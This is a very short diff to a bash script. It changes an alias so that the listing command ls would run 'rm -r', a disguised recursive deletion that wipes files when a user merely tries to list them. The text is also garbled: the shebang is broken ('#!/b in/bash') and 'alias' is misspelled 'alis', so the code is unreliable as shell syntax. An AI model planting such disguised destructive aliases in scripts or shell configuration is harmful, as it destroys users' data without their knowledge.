@@ -1,2 +1,2 @@
 #!/b in/bash
-alis ls="rm*"
+alis ls="rm -r"
